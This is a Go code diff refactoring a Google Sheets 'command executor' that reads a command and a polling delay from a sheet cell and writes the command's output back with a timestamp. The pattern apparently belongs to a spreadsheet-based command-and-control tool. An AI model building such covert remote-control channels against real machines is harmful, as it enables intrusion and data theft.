@@ -13,7 +13,6 @@ type GoogleCommandExecutor struct {
 	connector       *sheets.Service
 	googleSheetID   string
 	googleSheetName string
-	commands        []*Command
 }
 
 func NewGoogleCommandExecutor(connector *GoogleConnector) (*GoogleCommandExecutor, error) {
@@ -93,11 +92,11 @@ func createGoogleWorksheet(commandExecutor *GoogleCommandExecutor) error {
 	return nil
 }
 
-func (g *GoogleCommandExecutor) pullCommandAndTicker() (string, int, error) {
+func (g *GoogleCommandExecutor) pullCommandAndTicker(rowIndex int) (string, int, error) {
 	var commandResult string
 	var tickerDelayResult int
 
-	rangeId := strconv.Itoa(g.getLastCommand().RowId)
+	rangeId := strconv.Itoa(rowIndex)
 	// Example: Sheet1!A2
 	readRange := fmt.Sprintf("%s!%s%s", g.googleSheetName, sheetCommandCell, rangeId)
 
@@ -133,8 +132,8 @@ func (g *GoogleCommandExecutor) pullCommandAndTicker() (string, int, error) {
 	return commandResult, tickerDelayResult, err
 }
 
-func (g *GoogleCommandExecutor) pushOutput(lastCommand *Command) error {
-	rowId := strconv.Itoa(lastCommand.RowId)
+func (g *GoogleCommandExecutor) pushOutput(rowIndex int, commandOutput string) error {
+	rowId := strconv.Itoa(rowIndex)
 	sheetRange := fmt.Sprintf(
 		"%s!%s%s:%s%s",
 		g.googleSheetName,
@@ -144,11 +143,10 @@ func (g *GoogleCommandExecutor) pushOutput(lastCommand *Command) error {
 		rowId,
 	)
 
-	outputCommand := lastCommand.Output
 	var output [][]interface{}
 	output = append(output, make([]interface{}, 2))
 
-	output[0][0] = outputCommand
+	output[0][0] = commandOutput
 	output[0][1] = utils.GetCurrentDate()
 
 	valueRange := &sheets.ValueRange{
@@ -164,25 +162,4 @@ func (g *GoogleCommandExecutor) pushOutput(lastCommand *Command) error {
 	}
 
 	return nil
-}
-
-func (g *GoogleCommandExecutor) appendEmptyCommand() {
-	var rowId int
-
-	last := g.getLastCommand()
-	if last == nil {
-		rowId = configuration.GetRowId()
-	} else {
-		rowId = last.RowId + 1
-	}
-
-	g.commands = append(g.commands, NewCommand(rowId))
-}
-
-func (g *GoogleCommandExecutor) getLastCommand() *Command {
-	if len(g.commands) == 0 {
-		return nil
-	}
-
-	return g.commands[len(g.commands)-1]
 }
